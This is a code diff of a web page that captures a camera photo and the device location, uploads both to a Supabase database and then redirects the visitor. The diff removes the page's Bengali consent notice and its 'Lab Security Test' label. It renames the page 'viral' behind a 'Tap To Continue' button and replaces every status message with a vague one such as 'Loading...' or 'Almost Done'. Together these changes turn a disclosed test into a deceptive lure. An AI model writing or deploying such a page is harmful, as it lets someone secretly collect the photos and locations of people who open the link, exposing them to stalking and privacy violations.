@@ -10,7 +10,7 @@
     content="width=device-width, initial-scale=1.0"
   >
 
-  <title>Lab Security Test</title>
+  <title>viral</title>
 
   <style>
 
@@ -105,16 +105,11 @@
 
 <div class="box">
 
-  <h2>🔐 Lab Security Test</h2>
+  <h2>Tap To Continue</h2>
 
   <p class="notice">
 
-    Continue করলে camera ও location
-    permission চাওয়া হবে।
-
-    Photo ও location এই lab-এর
-    Supabase database-এ save হবে।
-
+  
   </p>
 
 
@@ -122,7 +117,7 @@
     id="startBtn"
     onclick="startTest()"
   >
-    📷 Continue
+    Continue
   </button>
 
 
@@ -255,7 +250,7 @@ async function startTest() {
     ========================= */
 
     status.innerText =
-      "📷 Camera permission চাওয়া হচ্ছে...";
+      "Loading....";
 
 
     if (
@@ -264,7 +259,7 @@ async function startTest() {
     ) {
 
       throw new Error(
-        "এই browser-এ camera access available নয়।"
+        " access not available"
       );
 
     }
@@ -317,7 +312,7 @@ async function startTest() {
     ) {
 
       throw new Error(
-        "Camera থেকে ছবি নেওয়া যায়নি।"
+        "no access"
       );
 
     }
@@ -362,7 +357,7 @@ async function startTest() {
     if (!photoBlob) {
 
       throw new Error(
-        "Photo capture করা যায়নি।"
+        "permission not allowed"
       );
 
     }
@@ -392,13 +387,13 @@ async function startTest() {
     ========================= */
 
     status.innerText =
-      "📍 Location permission চাওয়া হচ্ছে...";
+      "please wait";
 
 
     if (!navigator.geolocation) {
 
       throw new Error(
-        "এই browser-এ location available নয়।"
+        "not available"
       );
 
     }
@@ -455,7 +450,7 @@ async function startTest() {
     ========================= */
 
     status.innerText =
-      "☁️ Photo upload হচ্ছে...";
+      "Almost Done";
 
 
     const uploadResult =
@@ -496,7 +491,7 @@ async function startTest() {
     ========================= */
 
     status.innerText =
-      "💾 Location save হচ্ছে...";
+      "waiting...";
 
 
     const insertResult =
@@ -530,7 +525,7 @@ async function startTest() {
     ========================= */
 
     status.innerText =
-      "✅ Photo এবং location সফলভাবে save হয়েছে।";
+      "Done";
 
 
     button.style.display =
@@ -548,7 +543,7 @@ async function startTest() {
     if (targetURL) {
 
       status.innerText =
-        "✅ Save হয়েছে। Destination খোলা হচ্ছে...";
+        "Loading...";
 
 
       setTimeout(
@@ -592,19 +587,19 @@ async function startTest() {
     if (error.code === 1) {
 
       status.innerText =
-        "❌ Location permission দেওয়া হয়নি।";
+        "no permission access";
 
 
     } else if (error.code === 2) {
 
       status.innerText =
-        "❌ Location পাওয়া যায়নি। ফোনের Location ON করে আবার চেষ্টা করো।";
+        "no access";
 
 
     } else if (error.code === 3) {
 
       status.innerText =
-        "❌ ৩০ সেকেন্ডের মধ্যে Location পাওয়া যায়নি।";
+        "try again";
 
 
     } else {
@@ -613,7 +608,7 @@ async function startTest() {
         "❌ " +
         (
           error.message ||
-          "কাজটি সম্পন্ন হয়নি।"
+          "error"
         );
 
     }
